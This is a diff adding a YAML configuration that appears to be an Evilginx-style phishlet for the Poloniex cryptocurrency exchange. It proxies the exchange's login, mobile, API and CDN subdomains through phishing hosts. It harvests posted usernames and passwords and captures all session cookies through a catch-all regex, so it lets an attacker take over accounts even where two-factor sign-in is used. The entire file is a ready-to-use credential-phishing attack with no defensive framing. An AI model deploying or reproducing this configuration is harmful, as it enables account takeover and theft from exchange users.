@@ -1,0 +1,28 @@
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'login-m', orig_sub: 'login-m', domain: 'poloniex.com', session: true, is_landing: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'poloniex.com', session: true, is_landing: true}
+  - {phish_sub: 'm', orig_sub: 'm', domain: 'poloniex.com', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: '', domain: 'poloniex.com', session: true, is_landing: true}
+  - {phish_sub: 'x-api', orig_sub: 'x-api', domain: 'poloniex.com'}
+  - {phish_sub: 'trollbox-api', orig_sub: 'trollbox-api', domain: 'poloniex.com'}
+  - {phish_sub: 'cdn1', orig_sub: 'cdn1', domain: 'poloniex.com'}
+sub_filters: 
+  - {triggers_on: 'poloniex.com', orig_sub: '', domain: 'poloniex.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+auth_tokens:
+ - domain: '.poloniex.com'
+   keys: ['.*,regexp']
+auth_urls:
+   - '/v1/.*'
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.poloniex.com'
+  path: '/login'
